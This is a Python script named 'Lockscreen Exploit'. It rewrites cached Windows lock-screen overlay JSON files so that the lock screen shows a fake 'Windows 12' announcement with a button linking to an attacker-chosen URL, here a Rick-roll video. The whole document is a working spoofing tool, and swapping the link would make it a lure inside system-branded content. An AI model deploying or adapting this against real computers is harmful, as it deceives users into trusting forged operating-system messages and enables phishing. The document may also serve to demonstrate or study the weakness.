import os
import json
import argparse

parser = argparse.ArgumentParser("Lockscreen Exploit")

FAKE_TITLE = "Announcing Windows 12!"
FAKE_DESCRIPTION = "It's like Windows 11, but if people actually wanted it"
FAKE_BUTTON_URI = "microsoft-edge://?url=https://www.youtube.com/watch?v=dQw4w9WgXcQ"
FAKE_BUTTON_TEXT = "Get access now!"

content_parent = f"{os.environ["LOCALAPPDATA"]}\\Packages\\Microsoft.Windows.ContentDeliveryManager_cw5n1h2txyewy\\LocalState\\TargetedContentCache\\v3"

for child in os.scandir(content_parent):
    if not os.path.isdir(child):
        continue

    for file_name in os.listdir(child):
        file = os.path.join(content_parent, child, file_name)
        content = json.load(fp=open(file, "r", encoding="utf-8"))

        if content["name"] != "LockScreenOverlay":
            continue

        print("Target found")

        for i in range(len(content["items"])):
            content["items"][i]["properties"]["title"]["text"] = FAKE_TITLE
            content["items"][i]["properties"]["description"]["text"] = FAKE_DESCRIPTION
            content["items"][i]["properties"]["actionText"]["text"] = FAKE_BUTTON_TEXT
            content["items"][i]["properties"]["onClick"]["parameters"]["uri"] = FAKE_BUTTON_URI
            content["items"][i]["properties"]["onClick"]["parameters"]["actionText"] = FAKE_BUTTON_TEXT
            content["items"][i]["properties"]["onClick"]["parameters"]["description"] = FAKE_DESCRIPTION
            content["items"][i]["properties"]["onClick"]["parameters"]["title"] = FAKE_TITLE
        json.dump(content, fp=open(file, "w"))

        print("Finished. Lock your desktop to go to the lock screen")